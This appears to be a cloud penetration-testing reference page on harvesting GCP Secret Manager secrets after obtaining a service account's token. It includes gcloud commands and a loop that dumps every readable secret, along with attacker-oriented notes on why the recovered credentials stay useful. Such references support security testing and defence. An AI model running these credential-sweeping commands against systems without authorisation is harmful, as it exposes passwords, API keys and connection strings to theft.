---
title: "Secret Manager: reading stored secrets with versions.access"
description: "Reading stored secrets with secretmanager.versions.access when a principal or service account holds Secret Manager access."
keywords:
  - Secret Manager
  - secretmanager.versions.access
  - secret
  - credential store
  - GCP
  - access
---

# Secret Manager

Secret Manager holds credentials for applications to fetch at runtime, so `secretmanager.versions.access` is a read straight into the project's passwords, API keys, and connection strings. The permission is often granted broadly to application service accounts, which makes it a prime target once you hold such an account's token.

## Listing and reading

```bash
gcloud secrets list --format='value(name)'
gcloud secrets versions access latest --secret=<name>
# a specific version
gcloud secrets versions access 3 --secret=<name>
```

## Sweeping everything readable

```bash
for s in $(gcloud secrets list --format='value(name)'); do
  echo "== $s =="
  gcloud secrets versions access latest --secret="$s" 2>/dev/null
done
```

## Exploitation notes

- Reading a secret does not rotate it, so recovered database and third-party credentials keep working.
- IAM can be set per-secret, so a principal denied at the project level may still read individual secrets; enumerate `gcloud secrets get-iam-policy` where it matters.
- Disabled or destroyed versions do not return, but older enabled versions often do, which recovers a value rotated after exposure.

## Tools

- **gcloud** (`secrets versions access`).
- **GCPGoat** / **gcp_enum**-style scripts to bulk-sweep readable secrets.

## References

- [Google: Secret Manager access](https://cloud.google.com/secret-manager/docs/access-secret-version)
- [HackTricks Cloud: GCP Secret Manager](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
